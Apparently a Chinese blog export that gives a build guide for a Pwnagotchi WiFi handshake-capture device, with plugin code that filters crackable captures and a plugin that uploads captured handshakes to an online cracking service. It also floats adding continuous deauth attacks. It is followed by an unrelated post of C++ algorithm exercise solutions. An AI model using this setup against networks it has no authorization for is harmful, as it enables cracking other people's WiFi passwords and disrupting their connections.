https://pwnagotchi.org/\n\n\n这里我使用的不是官方版本 (evilsocket’s ver.), 而是 jayofelony’s ver., 前者已经好几年没更新了.\n以下是我的制作过程.\n\n材料清单硬件\n\n\n名称\n来源\n价格（元）\n\n\n\npi zero 2W + 32G SD卡\n小黄鱼\n105\n\n\n微雪2.13寸墨水屏 (V4)\n某宝\n74\n\n\nUPS-Lite v1.3\n小黄鱼\n33\n\n\nUSB - Micro USB 线\n不知哪里摸出来的\n0\n\n\n软件\n\n\n名称\n描述\n\n\n\nPwnagotchi\n系统镜像, 建议用 gh-proxy.com 加速下载\n\n\nRPi Imager\n用于烧录镜像\n\n\nRNDIS Driver\nRNDIS 的驱动\n\n\n\n安装步骤烧录系统跟着 wiki 做就行了.\n下载镜像, 并使用 RPi Imager 烧录到 SD 卡.\n\n\n\nRPi Device\n操作系统\n储存卡\nNext\n\n\n\npi zero 2W\nUse custom-&gt;下载的系统镜像\nSD卡\n不要使用自定义配置!\n\n\n把 SD 卡插到板子上, 如图组装好电脑, 用 USB - Micro USB 线连接电脑.\n注意, 必须接到板子中间的 Micro USB 接口上, 最旁边的接口不支持数据传输.\n开启网络共享电脑下载并安装 RNDIS 驱动. 安装方式: 解压出两个文件, 右键 RNDIS.inf, 选择 安装.\n然后, 在 控制面板 -&gt; 网络和 Internet -&gt; 网络连接 (可在启动菜单搜索) 找到这个 USB Ethernet&#x2F;RNDIS Gadget 适配器, 右键选择 属性.\n按照下图进行设置:\n\n\n\n然后, 可以 ping 10.0.0.1, 能 ping 通说明设置成功.\n下载 该脚本, 并在 PowerShell 中运行:\n.\\win_connection_share.ps1 -EnableInternetConnectionSharing\n\n第一个选择电脑的网卡适配器, 第二个选择 RNDIS 适配器.\n设置好后, 就可以 SSH 连接板子了.\nSSH 完成基础配置使用系统自带的 SSH 连接板子.\n当然, 用 PuTTY, FinalShell, XShell 等工具也行.\n用户名是 pi, 密码是 raspberry.\nssh pi@10.0.0.2# 如果问是否保存 fingerprint, 输入 yes# 然后输入密码 raspberry\n\n然后再输入 sudo pwnagotchi --wizard, 根据提示一步步配置.\n参考配置:\npi@pwnagotchi:~ $ sudo pwnagotchi --wizardDo you want to restore the previous configuration?[Y/N]: NThis will create a new configuration file and overwrite your current backup, are you sure?[Y/N]: YWelcome to the interactive installation of your personal Pwnagotchi configuration!My name is Jayofelony, how may I call you?Pwnagotchi name (no spaces): CoCoPwnyI shall go by CoCoPwny from now on!How many networks do you want to whitelist? We will also ask a MAC for each network?Each SSID and BSSID count as 1 network.Be sure to use digits as your answer.Amount of networks: 0Do you want to enable BT-Tether? # 也可以选择 N, 后面再配置 BT-Tethering.[Y/N] YWhat name uses your phone, check settings?phoneWhat device do you use? android or ios?Device: androidWhat is the bluetooth MAC of your device?MAC: &lt;手机蓝牙 MAC&gt;Do you want to enable a display?[Y/N]: YWhat display do you use?Be sure to check for the correct display type @https://github.com/jayofelony/pwnagotchi/blob/master/pwnagotchi/utils.py#L240-L501Display type: waveshare_4 # 根据你的显示屏型号, 以及链接代码列出的显示屏型号来输入.Do you want to invert the display colors?N = Black backgroundY = White background[Y/N]: Ypi@pwnagotchi:~ $\n\n不出意外的话, 就能在显示屏上看到可爱的电子宠物了.\n浏览器访问 10.0.0.2:8080, 点击右下角的 Restart in AUTO mode, Pwnagotchi 就开始抓包啦~\n时区设置我没有安装 RTC 模块, 所以板子断电后显示的时间就不准了.\n但在终端输入 timedatectl status 后:\npi@CoCoPwny:~ $ timedatectl               Local time: Sat 2025-04-12 13:40:05 BST           Universal time: Sat 2025-04-12 12:40:05 UTC                 RTC time: n/a                Time zone: Europe/London (BST, +0100)System clock synchronized: yes              NTP service: active          RTC in local TZ: no\n\n可以发现, NTP 服务是开启的, 也就是说, 板子会自动同步互联网时间.\n接下来只需要修改时区就可以了.\nsudo raspi-config\n\n\n后面不需要我多说了, 改成 Asia - Shanghai 就行.\n\n插件使用较全的插件库: https://github.com/itsdarklikehell/pwnagotchi-plugins\n我安装的插件有:\n\n\n\n插件\n描述\n备注\n\n\n\nexpv2\n没啥用\n无\n\n\naircrackonly\n会自动删除非握手包和非 PMKID.\n缺点: 无法判断握手包是否是 WPA3.\n\n\nBT-Tethering\n通过手机蓝牙共享网络\n可以取代屏幕\n\n\nwpa-sec\n自动将握手包上传到 wpa-sec.stanev.org 进行破解\n需要先在 /etc/pwnagotchi/config.toml 填写 api_key, 然后在 web-ui 的插件列表里启用\n\n\nmemtemp\n显示内存占用, CPU 占用, 以及温度信息\n有 plus 版, 但我没用过.\n\n\nlogtail\n可以在 web-ui 中查看日志了\n无\n\n\nups_lite\n显示 ups-lite v1.3 的电量信息\n官方版本有 bugs, 我另外自己修改了一下\n\n\n安装配置插件后, 需要重启 Pwnagotchi 才能生效.\n下面是各个插件的安装使用方法.\nexpv2 (⭐)\n功能简介: 显示 level, experience, strength 信息. (没啥用)\n\n把 代码 扔到 /usr/local/share/pwnagotchi/custom-plugins/.\n把以下配置信息添加到 /etc/pwnagotchi/config.toml:\n(如果屏幕不是 2.13 寸, 可能得自己调整坐标.)\nmain.plugins.expv2.lvl_x_coord = 0main.plugins.expv2.lvl_y_coord = 82main.plugins.expv2.exp_x_coord = 38main.plugins.expv2.exp_y_coord = 82main.plugins.expv2.str_x_coord = 0main.plugins.expv2.str_y_coord = 93main.plugins.expv2.bar_symbols_count = 12\n\n效果: 图略\naircrackonly (⭐⭐)功能: 自动删除非握手包和非 PMKID.\n使用官方插件库里的代码 aircrackonly.py\n或者我自己魔改的代码 (仍然有问题, 可能还是自己写一个移除非握手包的脚本.):\n\n    展开代码 \n    \n      &quot;&quot;&quot;Modified from https://github.com/evilsocket/pwnagotchi-plugins-contrib/blob/master/aircrackonly.py&quot;&quot;&quot;import pwnagotchi.plugins as pluginsimport loggingimport subprocessimport stringimport os, uuidfrom pathlib import Path&#x27;&#x27;&#x27;Aircrack-ng needed, to install:&gt; apt-get install aircrack-ng&#x27;&#x27;&#x27;class AircrackOnly(plugins.Plugin):    __author__ = &#x27;pwnagotchi [at] Coast23 [dot] cn&#x27;    __version__ = &#x27;1.0.2&#x27;    __license__ = &#x27;GPL3&#x27;    __description__ = &#x27;Remove uncrackable pcap files&#x27;    def __init__(self):        self.text_to_set = &quot;&quot;    def on_loaded(self):        logging.info(&quot;aircrackonly plugin loaded&quot;)        if &#x27;face&#x27; not in self.options:            self.options[&#x27;face&#x27;] = &#x27;(&gt;.&lt;)&#x27;        check = subprocess.run(            (&#x27;/usr/bin/dpkg -l aircrack-ng | grep aircrack-ng | awk \\&#x27;&#123;print $2, $3&#125;\\&#x27;&#x27;), shell=True, stdout=subprocess.PIPE)        check = check.stdout.decode(&#x27;utf-8&#x27;).strip()        if check != &quot;aircrack-ng &lt;none&gt;&quot;:            logging.info(&quot;aircrackonly: Found &quot; + check)        else:            logging.warning(&quot;aircrack-ng is not installed!&quot;)    def on_handshake(self, agent, filename, access_point, client_station):        &quot;&quot;&quot;        作了较大改动.        I make some changes here.        &quot;&quot;&quot;        display = agent._view        keepfile = False        logging.info(&quot;[AircrackOnly] Checking &quot; + filename)        try:            dictpath = Path(f&quot;/tmp/&#123;uuid.uuid4()&#125;&quot;)            with open(dictpath, &quot;w&quot;) as f:                f.write(&quot;114514&quot;) # Pick a random unvalid password.            result = subprocess.run(                f&#x27;/usr/bin/aircrack-ng &quot;&#123;filename&#125;&quot; -w &quot;&#123;dictpath&#125;&quot;&#x27;,                shell = True,                stdout = subprocess.PIPE,                stderr = subprocess.PIPE,                timeout = 3            )                        os.remove(dictpath)            if &quot;KEY NOT FOUND&quot; not in result.stdout.decode(&#x27;utf-8&#x27;):                keepfile = False            else:                logging.info(f&quot;[AircrackOnly] &#123;filename&#125; is crackable.&quot;)                keepfile = True        except subprocess.TimeoutExpired:            &quot;&quot;&quot;            超时, 说明文件存在多个包, 改为判断是否含有握手包或 PMKID.            Timeout means there are multiple packages, we need to check if it contains a handshake or PMKID.            (其实只是我不会写交互)            To be honest, I don&#x27;t know how to interact with subprocess.Popen :(             &quot;&quot;&quot;            logging.info(f&quot;[AircrackOnly] Timeout while checking &#123;filename&#125;.&quot;)            if os.path.exists(dictpath): os.remove(dictpath)            proc = subprocess.Popen(                [&quot;/usr/bin/aircrack-ng&quot;, filename],                stdout=subprocess.PIPE,                stderr=subprocess.PIPE,                bufsize=1,                text=True,            )            try:                stdout, stderr = proc.communicate(timeout=5)                if &quot;1 handshake&quot; in stdout:                    keepfile = True                    logging.info(f&quot;[AircrackOnly] &#123;filename&#125; contains a handshake.&quot;)                                if &quot;PMKID&quot; in stdout:                                        keepfile = True                    logging.info(f&quot;[AircrackOnly] &#123;filename&#125; contains PMKIDs.&quot;)            except subprocess.TimeoutExpired: keepfile = False            finally: proc.terminate()        if keepfile:            logging.info(f&quot;[AircrackOnly] &#123;filename&#125; is kept.&quot;)                else:            self.text_to_set = &quot;Removed an uncrackable pcap&quot;            display.update(force=True)            logging.warning(f&quot;[AircrackOnly] &#123;filename&#125; is descarded.&quot;)            os.remove(filename)    def on_ui_update(self, ui):        if self.text_to_set:            ui.set(&#x27;face&#x27;, self.options[&#x27;face&#x27;])            ui.set(&#x27;status&#x27;, self.text_to_set)            self.text_to_set = &quot;&quot;\n\n    \n  \n\n把代码扔到 /usr/local/share/pwnagotchi/custom-plugins/.\n编辑 /etc/pwnagotchi/config.toml, 添加:\nmain.plugins.aircrackonly.enabled = true\n\n然后重启 Pwnagotchi.\n官方代码有 bugs , 我自己魔改的版本慎用.\nBT-Tethering (⭐⭐⭐)功能: 通过蓝牙共享网络, 用手机就能访问 web-ui. (以及用 termux 进行 SSH.)\n缺点: 似乎不支持断连后重连, 有空再看看怎么修.\n开启手机蓝牙网络共享不同手机方法可能不一样, 我这里是 连接与共享 -&gt; 个人热点 -&gt; 蓝牙网络共享.\n获取手机蓝牙 MAC不同手机方法可能不一样, 我这里是 关于本机 -&gt; 状态信息 -&gt; 蓝牙地址.\n配置 BT-Tethering参考自 wiki.\n开启手机蓝牙, 电脑 SSH 连接板子, 进行如下操作:\nsudo bluetoothctlscan on     # 扫描周围蓝牙设备# 等到你的手机出现在列表中pair &lt;手机蓝牙 MAC&gt;     # 配对trust &lt;手机蓝牙 MAC&gt;    # 信任\n\n然后, 编辑 /etc/pwnagotchi/config.toml, 找到和 main.plugins.bt-tether 有关的部分, 修改为:\nmain.plugins.bt-tether.enabled = truemain.plugins.bt-tether.phone-name = &quot;&quot;    # 手机名称, 填热点里显示的名称就行main.plugins.bt-tether.phone = &quot;&quot;         # android / iosmain.plugins.bt-tether.mac = &quot;&quot;           # 手机蓝牙 MACmain.plugins.bt-tether.ip = &quot;&quot;            # android 在 192.168.44.2-254 里挑一个, ios 在 172.20.10.2-254 里挑一个. 我设置的是 192.168.44.44\n\n保存, 重启 Pwnagotchi. (用 web-ui 或命令 pwnkill)\n然后, 如果看到手机蓝牙连上了板子, 且显示 已连接, 用于互联网连接共享, 就可以在手机上用 192.168.44.44 访问板子了.\nwpa-sec (⭐⭐⭐)功能: 自动把抓到的握手包上传到 wpa-sec.stanev.org 进行破解.\n效果图:\n\n注册 wpa-sec.stanev.org到 wpa-sec.stanev.org, 输入邮箱, 得到一个 key.\n编辑 /etc/pwnagotchi/config.toml, 找到 main.plugins.wpa-sec 的部分, 修改为:\nmain.plugins.wpa-sec.enabled = truemain.plugins.wpa-sec.api_key = &quot;&quot;    # 你的 key\n\n然后重启 Pwnagotchi.\nmemtemp (⭐⭐)在 web-ui 的插件列表中启用即可.\nlogtail (⭐⭐⭐)在 web-ui 的插件列表中启用即可.\nups_lite (⭐⭐⭐)在 web-ui 的插件列表中启用, 但这个官方插件有 bugs. 比如显示总是显示 0-, 而且没有任何日志.\n可以使用我的修改版:\n\n    展开代码 \n    \n      # Based on: https://github.com/PhreakBoutique/UPSLite_Plugin_1_3/blob/main/upslite_plugin_1_3.py# Reference: https://github.com/linshuqin329/UPS-Lite/blob/master/UPS-Lite_V1.3_CW2015/UPS_Lite_V1.3_CW2015.py# Note: This script has not been fully tested and may only work correctly on my setup.# Only applys to UPS Lite v1.3.import loggingimport osimport structimport timeimport RPi.GPIO as GPIOimport pwnagotchiimport pwnagotchi.plugins as pluginsimport pwnagotchi.ui.fonts as fontsfrom pwnagotchi.ui.components import LabeledValuefrom pwnagotchi.ui.view import BLACKCW2015_ADDRESS   = 0x62CW2015_REG_VCELL = 0x02CW2015_REG_SOC   = 0x04CW2015_REG_MODE  = 0x0ACHARGING_GPIO_PIN = 4INTERVAL = 30 # The interval to retry initialization if UPS object is None (in seconds)class UPS:    def __init__(self):        # Check if I2C is enabled        if not os.path.exists(&quot;/dev/i2c-1&quot;):            raise RuntimeError(&quot;I2C device not found&quot;)                        # Initialize GPIO once using BCM pin numbering        GPIO.setmode(GPIO.BCM)        GPIO.setwarnings(False)        GPIO.setup(CHARGING_GPIO_PIN, GPIO.IN)        import smbus        self._bus = smbus.SMBus(1)        self._bus.write_word_data(CW2015_ADDRESS, CW2015_REG_MODE, 0x30)    def voltage(self):        try:            read = self._bus.read_word_data(CW2015_ADDRESS, CW2015_REG_VCELL)            swapped = struct.unpack(&quot;&lt;H&quot;, struct.pack(&quot;&gt;H&quot;, read))[0]        #    return swapped * 1.25 / 1000 / 16            return swapped * 0.305 / 1000 # From linshuqin329&#x27;s script. Seems to be the correct one.        except Exception as e:            logging.error(&quot;[ups-lite] Voltage read error: %s&quot;, e)            return 0.0    def capacity(self):        try:            read = self._bus.read_word_data(CW2015_ADDRESS, CW2015_REG_SOC)            swapped = struct.unpack(&quot;&lt;H&quot;, struct.pack(&quot;&gt;H&quot;, read))[0]            return swapped / 256        except Exception as e:            logging.error(&quot;[ups-lite] Capacity read error: %s&quot;, e)            return 0.0    def charging(self):        try:            return &#x27;+&#x27; if GPIO.input(CHARGING_GPIO_PIN) == GPIO.HIGH else &#x27;-&#x27;        except Exception as e:            logging.error(&quot;[ups-lite] Charging status error: %s&quot;, e)            return &#x27;-&#x27;    def cleanup(self):        # Clean up only the pin used by this plugin        GPIO.cleanup(CHARGING_GPIO_PIN)class UPSLite(plugins.Plugin):    __author__ = &#x27;Coast23&#x27;    __version__ = &#x27;1.0.1&#x27;    __license__ = &#x27;GPL3&#x27;    __description__ = &#x27;A plugin that will add a voltage indicator for the UPS Lite v1.3. Bugs fixed by Coast23.&#x27;    def __init__(self):        self.ups = None        self.last = 0        self.interval = INTERVAL    def get_ups(self):        try:            self.ups = UPS()            logging.info(&quot;[ups-lite] UPS initialized successfully.&quot;)        except Exception as e:            logging.warning(&quot;[ups-lite] Failed to initialize UPS.&quot;)            self.ups = None            self.last = time.time()    def on_loaded(self):        self.get_ups()    def on_ui_setup(self, ui):        ui.add_element(&#x27;ups&#x27;, LabeledValue(color=BLACK, label=&#x27;UPS&#x27;, value=&#x27;0%&#x27;, position=(ui.width() / 2 + 15, 0),                                           label_font=fonts.Bold, text_font=fonts.Medium))    def on_unload(self, ui):        with ui._lock:            ui.remove_element(&#x27;ups&#x27;)        if self.ups:            self.ups.cleanup()            logging.info(&quot;[ups-lite] UPS plugin unloaded and GPIO cleaned.&quot;)    def on_ui_update(self, ui):        now = time.time()        # Retry initialization if UPS object is None        if self.ups is None and now - self.last &gt;= self.interval:            self.get_ups()        if self.ups:            capacity = self.ups.capacity()            charging = self.ups.charging()            ui.set(&#x27;ups&#x27;, &quot;%2i%s&quot; % (capacity, charging))        else:            ui.set(&#x27;ups&#x27;, &quot;???&quot;)\n\n    \n  \n\n注意, v1.1, v1.2 和 v1.3 的 ups-lite 不一样, 这里的插件只适用于 v1.3.\n\n待解决的问题\nBT-Tethering 断连后无法重连\nAircrackOnly 插件有时似乎不工作\nups-lite 有时还是错误地显示 0% \n中文 WiFi 名 会显示成☐ (字体问题)\n按SSID添加白名单似乎不起作用\n从手机获取 GPS 信息.\n加一个邪恶的功能: 不断发起 Deauth 攻击.\n\n","tags":["Pwnagotchi"]},{"title":"程序设计实践 Week1 解题记录","url":"/2025/06/30/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5-Week1-%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"前言Week 1 的题目太菜了, 一天就 AK 了.\n尽量选了一些相对难的题目来讲.\n1. 两数之和\n  \n    \n      题意简述\n\n    \n    \n      给定一个不含重复元素的升序数组 a, 求出所有  的组合.\n题目保证组合唯一.\n\n    \n  \n\n\n    Solution \n    \n      不需要双指针, 直接用 unordered_map 记录出现过的数即可.\n在  枚举 a[i], 查找 target - a[i] 在 map 中是否出现过.\n时间复杂度 . 如果 a 不是有序的, 那么这种做法比双指针优, 因为不需要排序.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;unordered_map&gt;int a[1000006];std::unordered_map&lt;int, int&gt; idx;int target, n;int main(){    scanf(\"%d%d\", &amp;target, &amp;n);    for(int i = 0; i &lt; n; ++i){        scanf(\"%d\", &amp;a[i]);        idx[a[i]] = i;    }    for(int i = 0; i &lt; n; ++i){        if(idx.find(target - a[i])!= idx.end()){            printf(\"%d %d\\n\", i, idx[target - a[i]]);            return 0;        }    }}\n\n    \n  \n\n\n2. 三数之和\n  \n    \n      题意简述\n\n    \n    \n      找出所有数对, 满足: .\n不允许有重复数字.\n\n    \n  \n\n\n    Solution \n    \n      固定 , 然后在  中寻找 .\n为了在线性复杂度内求出  和 , 使用双指针法:\n令 , .\n\n若 , 说明  太小, 令 .\n若 , 说明  太大, 令 .\n若 , 输出  即可, 去重后令  和 .\n\n持续以上过程直至 .\n总的时间复杂度为 .\nAC Code:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;#define MAXN 10004int k, n;struct val{    int x;    int id;}a[MAXN];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int main(){    k = read(); n = read();    for(int i = 0; i &lt; n; ++i) a[i].x = read(), a[i].id = i;    std::sort(a, a + n, [](val a, val b){return a.x &lt; b.x;});    for(int i = 0; i &lt; n - 2; ++i){        if(i &gt; 0 and a[i].x == a[i-1].x) continue;        int l = i + 1, r = n - 1;        while(l &lt; r){            if(a[i].x + a[l].x + a[r].x &gt; k) r--;            else if(a[i].x + a[l].x + a[r].x &lt; k) l++;            else{                printf(\"%d %d %d\\n\", a[i].x, a[l].x, a[r].x);                while(l &lt; r and a[l].x == a[l+1].x) l++;                while(l &lt; r and a[r].x == a[r-1].x) r--;                l++, r--;            }        }    }}\n\n    \n  \n\n\n3. 四数之和\n  \n    \n      题意简述\n\n    \n    \n      找出所有数对, 满足: .\n不允许有重复数值.\n\n    \n  \n\n\n    Solution \n    \n      固定  和 , 然后用双指针法在  中寻找 .\n时间复杂度 .\nAC Code:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;#define MAXN 10004int k, n;struct val{    int x;    int id;}a[MAXN];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int main(){    k = read(); n = read();    for(int i = 0; i &lt; n; ++i) a[i].x = read(), a[i].id = i;    std::sort(a, a + n, [](val a, val b){return a.x &lt; b.x;});    for(int i = 0; i &lt; n - 2; ++i){        if(i &gt; 0 and a[i].x == a[i-1].x) continue;        int l = i + 1, r = n - 1;        while(l &lt; r){            if(a[i].x + a[l].x + a[r].x &gt; k) r--;            else if(a[i].x + a[l].x + a[r].x &lt; k) l++;            else{                printf(\"%d %d %d\\n\", a[i].x, a[l].x, a[r].x);                while(l &lt; r and a[l].x == a[l+1].x) l++;                while(l &lt; r and a[r].x == a[r-1].x) r--;                l++, r--;            }        }    }}\n\n    \n  \n\n\n4. 汉诺塔I\n  \n    \n      题意简述\n\n    \n    \n      经典问题.\n有三根柱子和不同大小的圆盘, 起始时所有圆盘都堆叠在第一根柱子上, 大的在下, 小的在上. 求将所有圆盘移动到第三根柱子上的最少移动步骤.\n移动遵循以下规则:\n\n一次只能移动一个圆盘.\n大盘不能在小盘上面. (目标柱上)\n可以借助中间柱子.\n\n\n    \n  \n\n\n    Solution \n    \n      现对题目进行形式化描述与推导.\n令  : 移动  个盘子, 其中  为起始柱子,  为辅助柱子,  为目标柱子.\n\n若 , 则直接移动  上的圆盘到  上, 也就是打印 A-&gt;C.\n若  :\n先把  个盘子从  移动到  上, 这个时候需要  来当辅助柱子, 也就是执行 .\n然后,  上就剩最大的盘子了, 把它移动到  上, 打印 A-&gt;C.\n最后, 把  个盘子从  移动到  上, 这个时候需要  来当辅助柱子, 也就是执行 .\n\n\n\n递归这个 Hanoi 函数, 即可求出最少移动步数.\n时间复杂度 .\nAC Code:\n#include &lt;cstdio&gt;#include &lt;algorithm&gt;void hanoi(int n, char u, char s, char v){    if(n == 1){        printf(\"%c-&gt;%c\\n\", u, v);        return;    }    // n-1 from u to v    hanoi(n-1, u, v, s);    // move    printf(\"%c-&gt;%c\\n\", u, v);    // n-1 from s to v    hanoi(n-1, s, u, v);}int main(){    int n;    scanf(\"%d\", &amp;n);    hanoi(n, 'A', 'B', 'C');}\n\n    \n  \n\n\n5. 放苹果\n  \n    \n      题意简述\n\n    \n    \n      求把  个苹果放到  个盘子的方案数.\n.\n\n    \n  \n\n\n    Solution \n    \n      设  表示把  个苹果放到  个盘子的方案数.\n\n若 , 则  (空盘子的方案数为 ).\n若 , 则  (没有苹果的方案数为 ).\n特别地, 有  (空盘子和空苹果的方案数为 ).\n\n以上为边界情况, 接下来考虑递推求解 .\n\n首先, 如果 , 最多只能用到  个盘子(各放 1 个苹果), 也就是说 “ 个苹果放到  个盘子” 这个问题等价于 “ 个苹果放到  个盘子”, 所以 .\n\n否则, 我们作如下讨论:\n\n这  个盘子都不能放空. 也就是说, 每个盘子至少要放一个苹果.为了保证这一点, 我们可以先在各个盘子上放  个苹果, 然后再把剩下的  个苹果放到  个盘子上.方案数为 .\n这  个盘子至少有一个为空. 那只要把  个苹果放到  个盘子上即可.方案数为 .于是, 我们可以得到: .\n\n\n\n递推求解即可, 答案为 .\n时间复杂度 .\nAC Code:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;int T, n, m;long long dp[14][14];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch ^ 48);    return f ? x : -x;}int main(){    for(int i = 0; i &lt; 14; ++i) dp[0][i] = 1;    for(int i = 0; i &lt; 14; ++i) dp[i][1] = 1;    for(int m = 1; m &lt; 14; ++m){        for(int n = 2; n &lt; 14; ++n){            if(m &lt; n) dp[m][n] = dp[m][m];            else dp[m][n] = dp[m][n-1] + dp[m-n][n];        }    }    T = read();    while(T--){        m = read(); n = read();        printf(\"%lld\\n\", dp[m][n]);    }}\n\n    \n  \n\n\n6. 递归求波兰表达式\n  \n    \n      题意简述\n\n    \n    \n      给定一行前缀表达式, 请你计算算式结果.\n\n    \n  \n\n\n    Solution \n    \n      虽然题目叫 “递归求“, 但我用了更好看的写法(maybe): 栈.\n观察即可得到这样的做法:\n从右往左扫描表达式, 遇到数字就压栈, 遇到符号就取出栈顶的两个数字进行运算, 并将运算结果压栈.\n最后栈顶元素即为结果.\n需要注意, 取出栈顶数字的时候, 先取出来的是左操作数, 后取出来的是右操作数.\n可以使用 stod() 函数方便地把字符串转为 double 类型.\nAC Code:\n#include &lt;stack&gt;#include &lt;vector&gt;#include &lt;string&gt;#include &lt;cstdio&gt;#include &lt;iostream&gt;std::vector&lt;std::string&gt; a;std::stack&lt;double&gt; num;bool is_opt(const std::string&amp; s) {    return s == \"+\" || s == \"-\" || s == \"*\" || s == \"/\";}int main(){    std::string s;    while(std::cin &gt;&gt; s) a.push_back(s);    for(int i = a.size() - 1; ~i; --i){        if(is_opt(a[i])){            double num1 = num.top(); num.pop(); // 左            double num2 = num.top(); num.pop(); // 右            if(a[i] == \"+\") num.push(num1 + num2);            if(a[i] == \"-\") num.push(num1 - num2);            if(a[i] == \"*\") num.push(num1 * num2);            if(a[i] == \"/\") num.push(num1 / num2);        }        else num.push(std::stod(a[i]));    }    printf(\"%.6lf\\n\", num.top());}\n\n    \n  \n\n\n7. 算式表达式\n  \n    \n      题意简述\n\n    \n    \n      给定一行算式, 运算数在  以内, 运算符只有 + 和 *, 求算式对  取模的结果.\n算式一共有  个数字和  个运算符, .\n\n    \n  \n\n\n    Solution \n    \n      一开始没看数据范围, 想用 Python 的 eval() 函数, 结果吃了一发 RE.\n其实这题很简单, 只要想到处理 + 和 * 运算优先级的方法就行. 令 ans 表示当前计算的答案, cur 表示当前累计的乘法运算的结果, 从左到右扫描运算符:\n\n对于 *: 将 cur 乘以当前数字.\n对于 +: 将 ans 加上 cur, 然后将 cur 置为 .\n\n最后输出 (ans + cur) % MOD 即可.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;string&gt;#include &lt;iostream&gt;#define mod 1000000007int n;long long ans = 0;std::string str;int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int main(){    n = read(); // useless    std::cin &gt;&gt; str;    long long cur = str[0] xor 48;    for(int i = 1; i &lt; str.length(); i += 2){        char op = str[i];        int num = str[i+1] xor 48;        if(op == '*'){            cur = (cur * num) % mod;        }        else if(op == '+'){            ans = (ans + cur) % mod;            cur = num;        }    }    printf(\"%lld\\n\", (ans + cur) % mod);}\n\n    \n  \n\n\n8. 二进制密码锁\n  \n    \n      题意简述\n\n    \n    \n      给定两个 01 字符串  和 , 可对  的第  位字符进行操作, 操作会改变  及其相邻字符的状态, 求将  变为  的最少操作次数.\n\n    \n  \n\n\n    Solution \n    \n      将  和  按位异或得到 , 目标即为将  的每一位都变成 .\n我们从左到右扫描 , 如果  为 , 那么就需要靠  进行翻转来将  置 .\n在这个策略下, 对于 , 它可以靠自身翻转来改变状态, 也可以靠  进行翻转来改变状态.\n怎么办呢? 那就对  是否翻转进行分类讨论, 分别求出需要翻转的次数, 取最优即可.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;int n, ans;char in[35];int a[35];int b[35];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch ^ 48);    return f ? x : -x;}void flip(int i, int n, int arr[]){ // 对 arr[i] 进行操作    arr[i] = !arr[i];    if(i &gt; 1) arr[i-1] = !arr[i-1];    if(i &lt; n) arr[i+1] = !arr[i+1];}int min(int a, int b){return a &lt; b? a : b;}int main(){    std::cin &gt;&gt; in;    int n = strlen(in);    for(int i = 1; i &lt;= n; ++i) a[i] = in[i-1] xor 48;    std::cin &gt;&gt; in;    for(int i = 1; i &lt;= n; ++i) a[i] ^= (in[i-1] xor 48), b[i] = a[i];        int ans1 = 1, ans2 = 0;    // 翻转第1个    flip(1, n, a);    for(int i = 2; i &lt;= n; ++i) if(a[i-1]) flip(i, n, a), ++ans1;    // 不翻转第1个    for(int i = 2; i &lt;= n; ++i) if(b[i-1]) flip(i, n, b), ++ans2;    if(a[n]) ans1 = 11451419;    if(b[n]) ans2 = 11451419;    ans = min(ans1, ans2);    ans == 11451419? puts(\"impossible\") : printf(\"%d\\n\", ans);}\n\n    \n  \n\n\n9. 熄灯问题\n  \n    \n      题意简述\n\n    \n    \n      给定一个  的 01 矩阵 , 可对  进行操作, 操作会改变  及其相邻元素的状态, 要求最小化矩阵变为  的操作次数.\n输出字典序最小的对  的操作方案 (记为 ) . \n其实也就是二维的 “二进制密码锁”.\n\n    \n  \n\n\n    Solution \n    \n      显然,  的操作次数 .\n显然, 若  的状态确定, 那么  也就确定了, 因为现在只有  能影响  的状态.\n因此, 只需要枚举 , 即经过操作后第一行的状态, 就可以依次确定  ~  的状态.\n最后判断  是否已经变为 , 若是, 输出  即可.\n时间复杂度 O(), 这里  为常数, 直接说  好像也没啥问题.\nAC Code:\n// 太好了只有 6 * 6, 不需要考虑状压#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;int T;int a[10][10];int res[10][10];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f? x : -x;}void rev(int x, int y){    a[x][y] = !a[x][y];    if(x &gt; 1) a[x-1][y] = !a[x-1][y];    if(x &lt; 5) a[x+1][y] = !a[x+1][y];    if(y &gt; 1) a[x][y-1] = !a[x][y-1];    if(y &lt; 6) a[x][y+1] = !a[x][y+1];}bool test(){    int b[10][10];    for(int i = 1; i &lt;= 5; ++i) for(int j = 1; j &lt;= 6; ++j) b[i][j] = a[i][j];    for(int i = 1; i &lt;= 6; ++i){        if(res[1][i]) rev(1, i);    }    for(int i = 2; i &lt;= 5; ++i){        for(int j = 1; j &lt;= 6; ++j){            if(a[i-1][j]) res[i][j] = 1, rev(i, j);        }    }    bool flag = true;    for(int i = 1; i &lt;= 5; ++i){        for(int j = 1; j &lt;= 6; ++j){            if(a[i][j]){flag = false; break;}        }    }    